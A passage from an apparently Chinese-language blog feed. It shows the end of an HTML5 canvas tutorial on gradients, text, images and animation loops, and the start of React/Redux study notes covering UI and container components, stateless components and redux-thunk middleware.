javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lingrad = ctx.<span class="title function_">createLinearGradient</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="number">400</span>, <span class="number">400</span>);</span><br><span class="line">lingrad.<span class="title function_">addColorStop</span>(<span class="number">0</span>, <span class="string">&#x27;red&#x27;</span>);</span><br><span class="line">lingrad.<span class="title function_">addColorStop</span>(<span class="number">1</span>, <span class="string">&#x27;blue&#x27;</span>);</span><br><span class="line"></span><br><span class="line">ctx.<span class="property">fillStyle</span> = lingrad;</span><br><span class="line">ctx.<span class="title function_">fillRect</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="number">300</span>, <span class="number">300</span>);</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/a71efaafly1g2lzazsgdcj20es0erglz.jpg" alt=""></p><h2 id="2-API-1"><a href="#2-API-1" class="headerlink" title="2. API"></a>2. API</h2><p>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">createLinearrGradient(x1, y1, x2, y2) </span><br><span class="line">创建一个渐变对象，(x1, y1)是渐变的起始坐标，(x2, y2)是渐变的结束坐标</span><br><span class="line"></span><br><span class="line">addColorStop(rate, color)</span><br><span class="line">添加渐变颜色，rate为一个int值，初始值为0，colr为一个颜色</span><br></pre></td></tr></table></figure><h1 id="文字"><a href="#文字" class="headerlink" title="文字"></a>文字</h1><h2 id="1-添加文字"><a href="#1-添加文字" class="headerlink" title="1. 添加文字"></a>1. 添加文字</h2><p>使用 <code>fillText(content, x, y)</code> 来设置文字，注意(x, y)为文字基线的位置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.<span class="title function_">fillText</span>(<span class="string">&quot;你好&quot;</span>, <span class="number">100</span>, <span class="number">100</span>);</span><br></pre></td></tr></table></figure><h2 id="2-调整样式"><a href="#2-调整样式" class="headerlink" title="2. 调整样式"></a>2. 调整样式</h2><p>通过 <code>font</code> 属性来设置字体、字号</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.<span class="property">font</span> = <span class="string">&quot;宋体&quot;</span></span><br></pre></td></tr></table></figure><p><code>font</code> 的级联样式 <code>ctx.font = &quot;font-size font-family&quot;</code></p><h1 id="使用图片"><a href="#使用图片" class="headerlink" title="使用图片"></a>使用图片</h1><h2 id="1-添加图片"><a href="#1-添加图片" class="headerlink" title="1. 添加图片"></a>1. 添加图片</h2><p>添加一个图片首先要创建一个<code>img</code>的实例，设置实例的<code>src</code>，监听这个实例的load事件，当图片加载完成后，利用 <code>drawImage(img, x, y)</code> 绘制出图片，如下实例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;images/0.jpg&quot;</span>;</span><br><span class="line">img.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  ctx.<span class="title function_">drawImage</span>(img, <span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-API-2"><a href="#2-API-2" class="headerlink" title="2. API"></a>2. API</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">drawImage(img, x, y, w, h) </span><br><span class="line">img为一个图片示例，xy为图片左上角坐标，w为图片宽度，h为图片高度</span><br><span class="line"></span><br><span class="line">drawImage(img, X, Y, W, H, x, y, w, h) </span><br><span class="line">img为一个图片示例，XYWH可以设置图片的切片位置</span><br></pre></td></tr></table></figure><h1 id="运动"><a href="#运动" class="headerlink" title="运动"></a>运动</h1><h2 id="1-原理"><a href="#1-原理" class="headerlink" title="1. 原理"></a>1. 原理</h2><p>canvas中元素不能运动，因为上屏幕之后就再也得不到它了，没有任何变量可以持有。</p><p>所以必须通过重绘一个新的矩形，利用视觉暂留，形成运动。</p><p>清屏 → 更新 → 渲染 → 清屏 → 更新 → 渲染 → …</p><p>清屏：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.<span class="title function_">clearRect</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">800</span>, <span class="number">600</span>)</span><br></pre></td></tr></table></figure><h2 id="2-面向对象制变成作运动函数"><a href="#2-面向对象制变成作运动函数" class="headerlink" title="2. 面向对象制变成作运动函数"></a>2. 面向对象制变成作运动函数</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Circle</span>(<span class="params">x, y, r, color</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">x</span> = x;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">y</span> = y;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">r</span> = r;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">color</span> = color;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Circle</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">render</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  ctx.<span class="title function_">beginPath</span>();</span><br><span class="line">  ctx.<span class="title function_">arc</span>(<span class="variable language_">this</span>.<span class="property">x</span>, <span class="variable language_">this</span>.<span class="property">y</span>, <span class="variable language_">this</span>.<span class="property">r</span>, <span class="number">0</span>, <span class="title class_">Math</span>.<span class="property">PI</span> * <span class="number">2</span>, <span class="literal">true</span>);</span><br><span class="line">  ctx.<span class="property">fillStyle</span> = <span class="variable language_">this</span>.<span class="property">color</span>;</span><br><span class="line">  ctx.<span class="title function_">fill</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Circle</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">update</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">x</span> += <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> yuan = <span class="keyword">new</span> <span class="title class_">Circle</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="number">60</span>, <span class="string">&quot;blue&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  ctx.<span class="title function_">clearRect</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">800</span>, <span class="number">600</span>)</span><br><span class="line">  yuan.<span class="title function_">update</span>();</span><br><span class="line">  yuan.<span class="title function_">render</span>();</span><br><span class="line">&#125;, <span class="number">20</span>)</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/a71efaafly1g2m0noi2byg20jo0czwf3.gif" alt=""></p><h2 id="3-使用ES6来详细来面向对象编程编写动画函数"><a href="#3-使用ES6来详细来面向对象编程编写动画函数" class="headerlink" title="3. 使用ES6来详细来面向对象编程编写动画函数"></a>3. 使用ES6来详细来面向对象编程编写动画函数</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 接口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Actor</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    actorsArr.<span class="title function_">push</span>(<span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;所有演员必须重写render函数&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">update</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 留空为非必须定义项</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 圆类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Actor</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">x, y, r, color</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">x</span> = x;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">y</span> = y;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">r</span> = r;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">color</span> = color;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    ctx.<span class="title function_">beginPath</span>();</span><br><span class="line">    ctx.<span class="title function_">arc</span>(<span class="variable language_">this</span>.<span class="property">x</span>, <span class="variable language_">this</span>.<span class="property">y</span>, <span class="variable language_">this</span>.<span class="property">r</span>, <span class="number">0</span>, <span class="title class_">Math</span>.<span class="property">PI</span> * <span class="number">2</span>, <span class="literal">true</span>);</span><br><span class="line">    ctx.<span class="property">fillStyle</span> = <span class="variable language_">this</span>.<span class="property">color</span>;</span><br><span class="line">    ctx.<span class="title function_">fill</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">update</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">x</span>++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 所有演员的数组</span></span><br><span class="line"><span class="keyword">var</span> actorsArr = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> yuan = <span class="keyword">new</span> <span class="title class_">Circle</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="number">50</span>, <span class="string">&quot;red&quot;</span>);</span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  ctx.<span class="title function_">clearRect</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">800</span>, <span class="number">600</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; actorsArr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    actorsArr[i].<span class="title function_">update</span>();</span><br><span class="line">    actorsArr[i].<span class="title function_">render</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="number">20</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 快速使用 </tag>
            
            <tag> HTML5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React学习笔记04：Redux实战</title>
      <link href="/2019/05/da9549a02ea7.html"/>
      <url>/2019/05/da9549a02ea7.html</url>
      
        <content type="html"><![CDATA[<h1 id="01-UI组件与容器组件"><a href="#01-UI组件与容器组件" class="headerlink" title="01.UI组件与容器组件"></a>01.UI组件与容器组件</h1><p>UI组件负责页面渲染，容器组件负责页面逻辑</p><p>创建UI组件的核心思想就是把原组件中的<code>render</code>函数中的内容抽离出去为一个子组件，在父组件的<code>render</code>函数中只引入这个子组件。</p><p>如：我们把TodoList项目中的render部分抽离出去后，文件结构变为</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  index.js</span><br><span class="line">  TodoList.js</span><br><span class="line"><span class="addition">+ TodoListUI.js</span></span><br><span class="line">  /store </span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TodoList.js</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">TodoListUI</span> <span class="keyword">from</span> <span class="string">&#x27;./TodoListUI&#x27;</span></span><br><span class="line">... ...</span><br><span class="line"><span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">TodoListUI</span> /&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TodoListUI.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Button</span>, <span class="title class_">List</span>, <span class="title class_">Input</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;antd&#x27;</span>;</span><br><span class="line">... ...</span><br><span class="line"><span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="comment">// JSX中的DOM树</span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了能使<code>TodoListUI.js</code>中的方法和数据正常使用，在<code>TodoList.js</code>中调用子组件的时候需要将子组件中可能用到的所有方法和数据都传入子组件，如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">TodoListUI</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">inputValue</span>=<span class="string">&#123;this.state.inputValue&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">list</span>=<span class="string">&#123;this.state.list&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">handleInputChange</span>=<span class="string">&#123;this.handleInputChange&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">handleButtonClick</span>=<span class="string">&#123;this.handleButtonClick&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    <span class="attr">handleItemDelete</span>=<span class="string">&#123;this.handleItemDelete&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  /&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="02-无状态组件"><a href="#02-无状态组件" class="headerlink" title="02.无状态组件"></a>02.无状态组件</h1><p>当我们设计一个UI组件，如果这个组件只有render函数，可以将其转化为一个无状态组件，可以优化其性能，具体写法为使用一个变量存放一个函数，函数的参数为<code>props</code>，函数的返回值即为JSX的Virtual DOM内容。如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">NoStatusComponent</span> = (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Virtual DOM here<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title class_">NoStatusComponent</span></span><br></pre></td></tr></table></figure><h1 id="04-使用Redux-thunk中间件实现ajax数据请求"><a href="#04-使用Redux-thunk中间件实现ajax数据请求" class="headerlink" title="04.使用Redux-thunk中间件实现ajax数据请求"></a>04.使用Redux-thunk中间件实现ajax数据请求</h1><p>Redux-thunk可以让<code>actionCreator.js</code>中返回一个方法（默认actionCreator只能返回一个action对象），可以方便我们把异步操作抽离到<code>actionCreator.js</code>文件中。</p><h2 id="使用Redux中间件Redux-thunk"><a href="#使用Redux中间件Redux-thunk" class="headerlink" title="使用Redux中间件Redux-thunk"></a>使用Redux中间件Redux-thunk</h2><ol><li><p>在创建store的文件中（如Demon中的<code>./store/index.js</code>），在引入Redux时，引入<code>applyMiddleware</code>组件</p> <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import &#123; </span><br><span class="line">  createStore, </span><br><span class="line"><span class="addition">+ applyMiddleware </span></span><br><span class="line">&#125; from &#x27;redux&#x27;;</span><br><span class="line"><span class="addition">+ import thunk from &#x27;redux-thunk&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>在调用<code>createStore()</code>创建store时，第一个参数填入<code>reducer</code>对象，第二个参数传入一个<code>applyMiddleware()</code>方法，<del>这个方法的参数时一个数组，数组的内容即为要在store中使用的中间件列表（Redux DevTools实际也是一个中间件）</del>。我们在此处调用<code>thunk</code></p> <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const store = createStore(</span><br><span class="line">  reducer,</span><br><span class="line"><span class="addition">+ applyMiddleware(thunk)</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p>如果在此时还需要使用Redux DevTools，需要按照 <a href="https://github.com/zalmoxisus/redux-devtools-extension#12-advanced-store-setup">官方文档</a> 进行如下设置</p> <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 方案一 (不推荐)</span><br><span class="line">import &#123; </span><br><span class="line">  createStore, </span><br><span class="line">  applyMiddleware, </span><br><span class="line"><span class="addition">+ compose </span></span><br><span class="line">&#125; from &#x27;redux&#x27;;</span><br><span class="line">import thunk from &#x27;redux-thunk&#x27;</span><br><span class="line"></span><br><span class="line"><span class="addition">+ const composeEnhancers = window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ || compose;</span></span><br><span class="line"><span class="addition">+ const store = createStore(reducer, /* preloadedState, */ composeEnhancers(</span></span><br><span class="line"><span class="deletion">- const store = createStore(reducer, /* preloadedState, */ compose(</span></span><br><span class="line">    applyMiddleware(thunk)</span><br><span class="line">  ));</span><br></pre></td></tr></table></figure> <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 方案二（推荐）</span><br><span class="line">  import &#123; </span><br><span class="line">    createStore, </span><br><span class="line">    applyMiddleware, </span><br><span class="line"><span class="addition">+   compose </span></span><br><span class="line">  &#125; from &#x27;redux&#x27;;</span><br><span class="line">  import thunk from &#x27;redux-thunk&#x27;</span><br><span class="line"></span><br><span class="line"><span class="addition">+ const composeEnhancers =</span></span><br><span class="line"><span class="addition">+   window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ ?</span></span><br><span class="line"><span class="addition">+   window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__(&#123;</span></span><br><span class="line"><span class="addition">+ &#125;) : compose;</span></span><br><span class="line"></span><br><span class="line"><span class="addition">+ const enhancer = composeEnhancers(</span></span><br><span class="line"><span class="addition">+   applyMiddleware(thunk)</span></span><br><span class="line"><span class="addition">+ );</span></span><br><span class="line"></span><br><span class="line">  const store = createStore(</span><br><span class="line">    reducer,</span><br><span class="line"><span class="addition">+   enhancer</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure></li><li><p>将异步方法转入<code>actionCreator.js</code>中编写。</p><p> 我们在此模拟一个场景：当TodoList项目在页面加载后，需要发出AJAX请求来获取已有的TODO列表项，我们可以把这个AJAX请求放入<code>actionCreator.js</code>中，编写一个方法名为<code>getTodoList</code>。我们再这个方法中需要做三件事：</p><ol><li><p>通过AJAX获取数据，并生成一个action对象。</p></li><li><p>将数据通过store的<code>dispatch()</code>方法，将生成的action对象传递给store，让其处理数据。</p></li><li><p>将方法暴露出去，提供给<code>TodoList.js</code>组件使用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getTodoList</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function">(<span class="params">dispatch</span>) =&gt;</span> &#123;</span><br><span class="line">    axios.<span class="title function_">get</span>(<span class="string">&#x27;https://www.easy-mock.com/mock/5cb48651462c851178e00ed0/study/todoList&#x27;</span>)</span><br><span class="line">      .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = res.<span class="property">data</span>;  <span class="comment">// 获取数据</span></span><br><span class="line">        <span class="keyword">const</span> action = &#123;</span><br><span class="line">          <span class="attr">type</span>: <span class="variable constant_">INIT_LIST_ACTION</span>,</span><br><span class="line">          <span class="attr">data</span>: data</span><br><span class="line">        &#125;;  <span class="comment">// 生成action对象（要借助actionCreator已写好的方法）</span></span><br><span class="line">        <span class="title function_">dispatch</span>(action);  <span class="comment">// 向store传递action对象</span></span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后，我们在<code>TodoList.js</code>组件中引入该方法并且使用该方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; getTodoList &#125; <span class="keyword">from</span> <span class="string">&#x27;./store/actionCreator.js&#x27;</span></span><br><span class="line">... ...</span><br><span class="line"><span class="title function_">componentDidMount</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> action = <span class="title function_">getTodoList</span>();</span><br><span class="line">  store.<span class="title function_">dispatch</span>(action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此，我们调用<code>getTodoList()</code>，返回值是一个方法，而并非一个action对象，即<code>action</code>变量现在是一个方法。</p><p>当执行代码<code>store.dispatch(action)</code>时，redux-thunk将其进行了一个处理，当检测到传入<code>dispatch()</code>方法的参数是一个方法而并非一个对象时，会在此时执行传入的方法，并且在该方法(也就是<code>action</code>)的参数位上，传入store提供的<code>dispatch()</code>方法，这样在<code>action</code>方法执行时，<code>action</code>方法内部就可以直接使用<code>dispatch()</code>方法。</p><p>这就是为什么我们再<code>actionCreator.js</code>编写<code>getTodoList()</code>方法时，可以直接调用<code>dispatch()</code>方法的原因。</p><p>可以参考如下代码来理解redux-thunk在此处的操作（中间件操作原理）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 模拟原有的Store对象</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Store</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 挂载dispatch方法，只能处理对象</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">dispatch</span> = <span class="function">(<span class="params">obj</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> obj === <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">      <span class="comment">// 处理对象</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(obj);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="string">&quot;arguments error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过redux-thunk中间件封装后的Store对象</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Store</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 挂载dispatch方法，dispatch可以处理对象和函数</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">dispatch</span> = <span class="function">(<span class="params">obj</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> obj === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      <span class="comment">// 如果传入的是一个方法，就把该方法执行，并且向方法内部再传入dispatch方法本身</span></span><br><span class="line">      <span class="title function_">obj</span>(<span class="variable language_">this</span>.<span class="property">dispatch</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> obj === <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">      <span class="comment">// 如果传入的是一个对象，就直接处理对象</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(obj);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="string">&quot;arguments error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟在actionCreator.js中创建的方法</span></span><br><span class="line"><span 